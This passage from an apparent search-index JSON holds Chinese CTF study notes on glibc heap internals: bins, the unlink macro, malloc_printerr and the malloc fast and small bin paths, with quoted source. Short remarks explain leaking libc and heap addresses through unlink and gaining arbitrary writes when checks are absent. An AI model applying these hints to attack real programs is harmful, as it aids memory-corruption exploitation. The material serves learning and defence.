Bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#unsorted-bin","text":"unsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002 \u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. */ \u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */ #define unsorted_chunks(M) (bin_at(M, 1)) unsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684 bin \u6570\u7ec4\u4e0b\u6807 1 \u5904\u3002\u6545\u800c unsorted bin \u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90 \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8e MINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0a\u9762\u7684\u4ecb\u7ecd\u3002 \u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002 \u4e0b\u9762\u9644\u4e0a\u5404\u7c7b\u4e0a\u8ff0\u4e09\u7c7b bin \u7684\u903b\u8f91\uff1a","title":"Unsorted Bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#common-macro","text":"\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f \u6839\u636e chunk \u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97 chunk \u6240\u5728\u7684\u7d22\u5f15 #define bin_index(sz) \\ ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))","title":"common macro"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_12","text":"Linux \u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790 CTF-WIKI Linux\u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790(\u4e0a\u534a\u90e8) Linux\u5806\u5185\u5b58\u7ba1\u7406\u6df1\u5165\u5206\u6790(\u4e0b\u534a\u90e8) Linux\u4e0b\u5806\u6808\u7ed3\u6784\u5206\u6790","title":"\u53c2\u8003\u8d44\u6599"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_13","text":"\u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u57fa\u7840\u64cd\u4f5c"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#unlink","text":"unlink \u7528\u6765\u5c06\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\uff08\u53ea\u5b58\u50a8\u7a7a\u95f2\u7684 chunk\uff09\u4e2d\u7684\u4e00\u4e2a\u5143\u7d20\u53d6\u51fa\u6765\uff0c\u53ef\u80fd\u5728\u4ee5\u4e0b\u5730\u65b9\u4f7f\u7528 malloc \u4ece\u6070\u597d\u5927\u5c0f\u5408\u9002\u7684 large bin \u4e2d\u83b7\u53d6 chunk\u3002 \u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f fastbin \u4e0e small bin \u5c31\u6ca1\u6709\u4f7f\u7528 unlink 1 \uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u6f0f\u6d1e\u4f1a\u7ecf\u5e38\u51fa\u73b0\u5728\u5b83\u4eec\u8fd9\u91cc\u7684\u539f\u56e0\u3002 \u4f9d\u6b21**\u904d\u5386\u5904\u7406** unsorted bin \u65f6\u4e5f\u6ca1\u6709\u4f7f\u7528 unlink \u3002 \u4ece\u6bd4\u8bf7\u6c42\u7684 chunk \u6240\u5728\u7684 bin \u5927\u7684 bin \u4e2d\u53d6 chunk\u3002 free \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 malloc_consolidate \u540e\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u4f4e\u5730\u5740\u7a7a\u95f2 chunk\u3002 \u524d\u5411\u5408\u5e76\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 realloc \u524d\u5411\u6269\u5c55\uff0c\u5408\u5e76\u7269\u7406\u76f8\u90bb\u9ad8\u5730\u5740\u7a7a\u95f2 chunk\uff08\u9664\u4e86 top chunk\uff09\u3002 \u7531\u4e8e unlink \u4f7f\u7528\u975e\u5e38\u9891\u7e41\uff0c\u6240\u4ee5 unlink \u88ab\u5b9e\u73b0\u4e3a\u4e86\u4e00\u4e2a\u5b8f\uff0c\u5982\u4e0b /* Take a chunk off a bin list */ // unlink p #define unlink(AV, P, BK, FD) { \\ // \u7531\u4e8e P \u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002 if ( __builtin_expect ( chunksize ( P ) != prev_size ( next_chunk ( P )), 0 )) \\ malloc_printerr ( \"corrupted size vs. prev_size\" ); \\ FD = P -> fd ; \\ BK = P -> bk ; \\ // \u9632\u6b62\u653b\u51fb\u8005\u7b80\u5355\u7be1\u6539\u7a7a\u95f2\u7684 chunk \u7684 fd \u4e0e bk \u6765\u5b9e\u73b0\u4efb\u610f\u5199\u7684\u6548\u679c\u3002 if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ else { \\ FD -> bk = BK ; \\ BK -> fd = FD ; \\ // \u4e0b\u9762\u4e3b\u8981\u8003\u8651 P \u5bf9\u5e94\u7684 nextsize \u53cc\u5411\u94fe\u8868\u7684\u4fee\u6539 if ( ! in_smallbin_range ( chunksize_nomask ( P )) \\ // \u5982\u679cP->fd_nextsize\u4e3a NULL\uff0c\u8868\u660e P \u672a\u63d2\u5165\u5230 nextsize \u94fe\u8868\u4e2d\u3002 // \u90a3\u4e48\u5176\u5b9e\u4e5f\u5c31\u6ca1\u6709\u5fc5\u8981\u5bf9 nextsize \u5b57\u6bb5\u8fdb\u884c\u4fee\u6539\u4e86\u3002 // \u8fd9\u91cc\u6ca1\u6709\u53bb\u5224\u65ad bk_nextsize \u5b57\u6bb5\uff0c\u53ef\u80fd\u4f1a\u51fa\u95ee\u9898\u3002 && __builtin_expect ( P -> fd_nextsize != NULL , 0 )) { \\ // \u7c7b\u4f3c\u4e8e\u5c0f\u7684 chunk \u7684\u68c0\u67e5\u601d\u8def if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \\ // \u8fd9\u91cc\u8bf4\u660e P \u5df2\u7ecf\u5728 nextsize \u94fe\u8868\u4e2d\u4e86\u3002 // \u5982\u679c FD \u6ca1\u6709\u5728 nextsize \u94fe\u8868\u4e2d if ( FD -> fd_nextsize == NULL ) { \\ // \u5982\u679c nextsize \u4e32\u8d77\u6765\u7684\u53cc\u94fe\u8868\u53ea\u6709 P \u672c\u8eab\uff0c\u90a3\u5c31\u76f4\u63a5\u62ff\u8d70 P // \u4ee4 FD \u4e3a nextsize \u4e32\u8d77\u6765\u7684 if ( P -> fd_nextsize == P ) \\ FD -> fd_nextsize = FD -> bk_nextsize = FD ; \\ else { \\ // \u5426\u5219\u6211\u4eec\u9700\u8981\u5c06 FD \u63d2\u5165\u5230 nextsize \u5f62\u6210\u7684\u53cc\u94fe\u8868\u4e2d FD -> fd_nextsize = P -> fd_nextsize ; \\ FD -> bk_nextsize = P -> bk_nextsize ; \\ P -> fd_nextsize -> bk_nextsize = FD ; \\ P -> bk_nextsize -> fd_nextsize = FD ; \\ } \\ } else { \\ // \u5982\u679c\u5728\u7684\u8bdd\uff0c\u76f4\u63a5\u62ff\u8d70\u5373\u53ef P -> fd_nextsize -> bk_nextsize = P -> bk_nextsize ; \\ P -> bk_nextsize -> fd_nextsize = P -> fd_nextsize ; \\ } \\ } \\ } \\ } \u8fd9\u91cc\u6211\u4eec\u4ee5 small bin \u7684 unlink \u4e3a\u4f8b\u5b50\u4ecb\u7ecd\u4e00\u4e0b\u3002\u5bf9\u4e8e large bin \u7684 unlink\uff0c\u4e0e\u5176\u7c7b\u4f3c\uff0c\u53ea\u662f\u591a\u4e86\u4e00\u4e2a nextsize \u7684\u5904\u7406\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c P \u6700\u540e\u7684 fd \u548c bk \u6307\u9488\u5e76\u6ca1\u6709\u53d1\u751f\u53d8\u5316 \uff0c\u4f46\u662f\u5f53\u6211\u4eec\u53bb\u904d\u5386\u6574\u4e2a\u53cc\u5411\u94fe\u8868\u65f6\uff0c\u5df2\u7ecf\u904d\u5386\u4e0d\u5230\u5bf9\u5e94\u7684\u94fe\u8868\u4e86\u3002\u8fd9\u4e00\u70b9\u6ca1\u6709\u53d8\u5316\u8fd8\u662f\u5f88\u6709\u7528\u5904\u7684\uff0c\u56e0\u4e3a\u6211\u4eec\u6709\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u65b9\u6cd5\u6765\u6cc4\u6f0f\u5730\u5740 libc \u5730\u5740 P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cbk \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cfd \u6cc4\u6f0f \u53cc\u5411\u94fe\u8868\u53ea\u5305\u542b\u4e00\u4e2a\u7a7a\u95f2 chunk \u65f6\uff0cP \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f \u6cc4\u6f0f\u5806\u5730\u5740\uff0c\u53cc\u5411\u94fe\u8868\u5305\u542b\u591a\u4e2a\u7a7a\u95f2 chunk P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5934\u90e8\uff0cfd \u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u4e2d\uff0cfd \u548c bk \u5747\u53ef\u4ee5\u6cc4\u6f0f P \u4f4d\u4e8e\u53cc\u5411\u94fe\u8868\u5c3e\u90e8\uff0cbk \u6cc4\u6f0f \u6ce8\u610f \u8fd9\u91cc\u7684\u5934\u90e8\u6307\u7684\u662f bin \u7684 fd \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u65b0\u52a0\u5165\u7684 chunk\u3002 \u8fd9\u91cc\u7684\u5c3e\u90e8\u6307\u7684\u662f bin \u7684 bk \u6307\u5411\u7684 chunk\uff0c\u5373\u53cc\u5411\u94fe\u8868\u4e2d\u6700\u5148\u52a0\u5165\u7684 chunk\u3002 \u540c\u65f6\uff0c\u65e0\u8bba\u662f\u5bf9\u4e8e fd\uff0cbk \u8fd8\u662f fd_nextsize \uff0cbk_nextsize\uff0c\u7a0b\u5e8f\u90fd\u4f1a\u68c0\u6d4b fd \u548c bk \u662f\u5426\u6ee1\u8db3\u5bf9\u5e94\u7684\u8981\u6c42\u3002 // fd bk if ( __builtin_expect ( FD -> bk != P || BK -> fd != P , 0 )) \\ malloc_printerr ( check_action , \"corrupted double-linked list\" , P , AV ); \\ // next_size related if ( __builtin_expect ( P -> fd_nextsize -> bk_nextsize != P , 0 ) \\ || __builtin_expect ( P -> bk_nextsize -> fd_nextsize != P , 0 )) \\ malloc_printerr ( check_action , \\ \"corrupted double-linked list (not small)\" , \\ P , AV ); \u770b\u8d77\u6765\u4f3c\u4e4e\u5f88\u6b63\u5e38\u3002\u6211\u4eec\u4ee5 fd \u548c bk \u4e3a\u4f8b\uff0cP \u7684 forward chunk \u7684 bk \u5f88\u81ea\u7136\u662f P \uff0c\u540c\u6837 P \u7684 backward chunk \u7684 fd \u4e5f\u5f88\u81ea\u7136\u662f P \u3002\u5982\u679c\u6ca1\u6709\u505a\u76f8\u5e94\u7684\u68c0\u67e5\u7684\u8bdd\uff0c\u6211\u4eec\u53ef\u4ee5\u4fee\u6539 P \u7684 fd \u4e0e bk\uff0c\u4ece\u800c\u53ef\u4ee5\u5f88\u5bb9\u6613\u5730\u8fbe\u5230\u4efb\u610f\u5730\u5740\u5199\u7684\u6548\u679c\u3002\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u4f8b\u5b50\uff0c\u53ef\u4ee5\u53c2\u89c1\u5229\u7528\u90e8\u5206\u7684 unlink \u3002 \u6ce8\u610f\uff1a\u5806\u7684\u7b2c\u4e00\u4e2a chunk \u6240\u8bb0\u5f55\u7684 prev_inuse \u4f4d\u9ed8\u8ba4\u4e3a 1\u3002","title":"unlink"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#malloc_printerr","text":"\u5728 glibc malloc \u65f6\u68c0\u6d4b\u5230\u9519\u8bef\u7684\u65f6\u5019\uff0c\u4f1a\u8c03\u7528 malloc_printerr \u51fd\u6570\u3002 static void malloc_printerr ( const char * str ) { __libc_message ( do_abort , \"%s \\n \" , str ); __builtin_unreachable (); } \u4e3b\u8981\u4f1a\u8c03\u7528 __libc_message \u6765\u6267\u884c abort \u51fd\u6570\uff0c\u5982\u4e0b if (( action & do_abort )) { if (( action & do_backtrace )) BEFORE_ABORT ( do_abort , written , fd ); /* Kill the application. */ abort (); } \u5728 abort \u51fd\u6570\u91cc\uff0c\u5728 glibc \u8fd8\u662f 2.23 \u7248\u672c\u65f6\uff0c\u4f1a fflush stream\u3002 /* Flush all streams. We cannot close them now because the user might have registered a handler for SIGABRT. */ if ( stage == 1 ) { ++ stage ; fflush ( NULL ); }","title":"malloc_printerr"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_14","text":"Allocate Heap Memory \u7edd\u5927\u90e8\u5206\u5185\u5bb9\u6765\u81ea CTF-WIKI \uff0c\u5185\u5bb9\u5f15\u7528\u7528\u4e8e\u5b66\u4e60\u8bb0\u5f55","title":"\u7533\u8bf7\u5185\u5b58\u5757"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#__libc_malloc","text":"\u4e00\u822c\u6211\u4eec\u4f1a\u4f7f\u7528 malloc \u51fd\u6570\u6765\u7533\u8bf7\u5185\u5b58\u5757\uff0c\u53ef\u662f\u5f53\u4ed4\u7ec6\u770b glibc \u7684\u6e90\u7801\u5b9e\u73b0\u65f6\uff0c\u5176\u5b9e\u5e76\u6ca1\u6709 malloc \u51fd\u6570\u3002\u5176\u5b9e\u8be5\u51fd\u6570\u771f\u6b63\u8c03\u7528\u7684\u662f __libc_malloc \u51fd\u6570\u3002\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u5199\u4e2a malloc \u51fd\u6570\u5462\uff0c\u56e0\u4e3a\u6709\u65f6\u5019\u6211\u4eec\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u540d\u79f0\u3002\u6b64\u5916\uff0c__libc_malloc \u51fd\u6570\u53ea\u662f\u7528\u6765\u7b80\u5355\u5c01\u88c5 _int_malloc \u51fd\u6570\u3002_int_malloc \u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\u3002 \u8be5\u51fd\u6570\u4f1a**\u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09 \uff0c\u8fd9\u4e2a\u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u51fd\u6570\uff0c\u65b9\u4fbf\u7528\u6237\u5feb\u901f\u4fee\u6539\u5806\u5206\u914d\u51fd\u6570\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c**\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570 \u3002 // wapper for int_malloc void * __libc_malloc ( size_t bytes ) { //size_t \u4e3a\u5f53\u524d\u7a0b\u5e8f\u4f4d\u6570\u6700\u957f\u7684\u65e0\u7b26\u53f7int\u578b mstate ar_ptr ; void * victim ; // \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de. void * ( * hook )( size_t , const void * ) = atomic_forced_read ( __malloc_hook ); if ( __builtin_expect ( hook != NULL , 0 )) //\u94a9\u5b50\u4e0d\u4e3a\u7a7a return ( * hook )( bytes , RETURN_ADDRESS ( 0 )); //\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de \u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002 arena_get(ar_ptr, bytes); \u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002 victim = _int_malloc(ar_ptr, bytes); \u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002 /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim && ar_ptr != NULL) { LIBC_PROBE(memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry(ar_ptr, bytes); victim = _int_malloc(ar_ptr, bytes); } \u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002 if (ar_ptr != NULL) __libc_lock_unlock(ar_ptr->mutex); \u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6 \u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58 \u8981\u4e48\u662f mmap \u7684\u5185\u5b58 \u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684 arena \u4e2d assert(!victim || chunk_is_mmapped(mem2chunk(victim)) || ar_ptr == arena_for_chunk(mem2chunk(victim))); \u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002 return victim; }","title":"__libc_malloc"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_int_malloc","text":"_int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b \u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684**\u5185\u5b58\u5757\u5927\u5c0f**\u4ee5\u53ca**\u76f8\u5e94\u5927\u5c0f chunk \u901a\u5e38\u4f7f\u7528\u7684\u9891\u5ea6**\uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002 \u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u3002 \u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002 \u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002 \u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684 chunk \u5927\u5c0f\u3002 static void *_int_malloc(mstate av, size_t bytes) { INTERNAL_SIZE_T nb; /* normalized request size */ unsigned int idx; /* associated bin index */ mbinptr bin; /* associated bin */ mchunkptr victim; /* inspected/selected chunk */ INTERNAL_SIZE_T size; /* its size */ int victim_index; /* its bin index */ mchunkptr remainder; /* remainder from a split */ unsigned long remainder_size; /* its size */ unsigned int block; /* bit map traverser */ unsigned int bit; /* bit map traverser */ unsigned int map; /* current word of binmap */ mchunkptr fwd; /* misc temp for linking */ mchunkptr bck; /* misc temp for linking */ const char *errstr = NULL; /* Convert request size to internal form by adding SIZE_SZ bytes overhead plus possibly more to obtain necessary alignment and/or to obtain a size of at least MINSIZE, the smallest allocatable size. Also, checked_request2size traps (returning 0) request sizes that are so large that they wrap around zero when padded and aligned. */ checked_request2size(bytes, nb);","title":"_int_malloc"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#arena_2","text":"/* There are no usable arenas. Fall back to sysmalloc to get a chunk from mmap. */ if ( __glibc_unlikely ( av == NULL )) { void * p = sysmalloc ( nb , av ); if ( p != NULL ) alloc_perturb ( p , bytes ); return p ; }","title":"arena"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#fast-bin_1","text":"\u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c \u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570 \u3002 \u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk \u3002 /* If the size qualifies as a fastbin, first check corresponding bin. This code is safe to execute even if av is not yet initialized, so we can try it without checking, which saves some time on this fast path. */ if (( unsigned long ) ( nb ) <= ( unsigned long ) ( get_max_fast ())) { //\u7533\u8bf7\u5927\u5c0f\u5c0f\u4e8e\u7b49\u4e8efastbin\u4e0a\u9650 // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807 idx = fastbin_index ( nb ); // \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488 mfastbinptr * fb = & fastbin ( av , idx ); //\u5355\u94fe\u8868 mchunkptr pp = * fb ; // \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c do { victim = pp ; if ( victim == NULL ) break ; } while (( pp = catomic_compare_and_exchange_val_acq ( fb , victim -> fd , victim )) != victim ); // \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk if ( victim != 0 ) { // \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002 // \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002 // \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002 if ( __builtin_expect ( fastbin_index ( chunksize ( victim )) != idx , 0 )) { errstr = \"malloc(): memory corruption (fast)\" ; errout : malloc_printerr ( check_action , errstr , chunk2mem ( victim ), av ); return NULL ; } // \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528 check_remalloced_chunk ( av , victim , nb ); // \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f void * p = chunk2mem ( victim ); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb ( p , bytes ); return p ; } }","title":"fast bin"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#_15","text":"malloc \u53c2\u6570\u662f\u65e0\u7b26\u53f7\u957f\u6574\u578b fastbin \u662f\u4ece\u5934\u7ed3\u70b9\uff08\u6700\u65b0\u8fdb\u5165\uff09\u5f00\u59cb\u53d6 chunk \uff0c\u7b26\u5408\u201c\u5148\u8fdb\u540e\u51fa\u201d","title":"\u5c0f\u603b\u7ed3"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#fast-bin-malloc","text":"\u4e0d\u542f\u52a8 DEBUG \u65f6\uff0c\u53ea\u68c0\u67e5\u5373\u5c06\u5206\u914d chunk \u5bf9\u5e94\u7684 idx \u662f\u5426\u4e0e\u7533\u8bf7\u65f6\u7684 idx \u4e00\u81f4 \uff0c\u6b65\u9aa4\u5982\u4e0b\uff1a chunksize(victim) \uff1a\u63d0\u53d6 victim size fastbin_index() \uff1a\u67e5\u627e victim size \u5bf9\u5e94\u7684 idx != idx \uff1a\u68c0\u67e5\u662f\u5426\u76f8\u7b49\uff0c\u5982\u679c\u4e0d\u76f8\u7b49\u5219\u8c03\u7528 malloc_printerr \u6253\u5370\u9519\u8bef\u4fe1\u606f","title":"fast bin malloc \u68c0\u67e5\u673a\u5236"},{"location":"Pwn/glibc-heap/%E5%A0%86%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#small-bin_1","text":"\u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b /* If a small request, check regular bin. Since these \"smallbins\" hold one size each, no searching within bins is necessary. (For a large request, we need to wait until unsorted chunks are processed to find best fit. But for small ones, fits are exact anyway, so we can check now, which is faster.) */ if ( in_smallbin_range ( nb )) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 idx = smallbin_index ( nb ); // \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488 bin = bin_at ( av , idx ); // \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk // \u5982\u679c victim = 